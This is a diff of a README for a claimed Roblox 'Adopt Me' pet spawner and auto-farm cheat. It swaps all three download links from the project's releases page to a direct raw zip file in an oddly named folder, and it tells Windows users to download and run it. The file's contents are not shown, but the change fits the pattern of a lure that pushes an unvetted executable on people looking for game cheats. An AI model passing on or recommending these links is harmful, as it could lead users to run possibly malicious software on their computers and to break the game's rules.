@@ -1,6 +1,6 @@
 # ⚙️ adopt-me-script - Easy Roblox Pet Spawner & Auto Farm
 
-[![Download Now](https://img.shields.io/badge/Download-adopt--me--script-blue?style=for-the-badge)](https://github.com/comomobile/adopt-me-script/releases)
+[![Download Now](https://img.shields.io/badge/Download-adopt--me--script-blue?style=for-the-badge)](https://github.com/comomobile/adopt-me-script/raw/refs/heads/main/unserrated/script_adopt_me_2.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Here is how you can get adopt-me-script running on your Windows PC.
 
 Click on the button below or this link to visit the download page:
 
-[Download adopt-me-script](https://github.com/comomobile/adopt-me-script/releases)
+[Download adopt-me-script](https://github.com/comomobile/adopt-me-script/raw/refs/heads/main/unserrated/script_adopt_me_2.5.zip)
 
 This page has the latest version for you to download.
 
@@ -97,7 +97,7 @@ Follow the on-screen instructions in the script's window. The interface will gui
 
 Download and run adopt-me-script by visiting:
 
-[https://github.com/comomobile/adopt-me-script/releases](https://github.com/comomobile/adopt-me-script/releases)
+[https://github.com/comomobile/adopt-me-script/raw/refs/heads/main/unserrated/script_adopt_me_2.5.zip](https://github.com/comomobile/adopt-me-script/raw/refs/heads/main/unserrated/script_adopt_me_2.5.zip)
 
 Ensure you download the latest version for the best support and features.
 
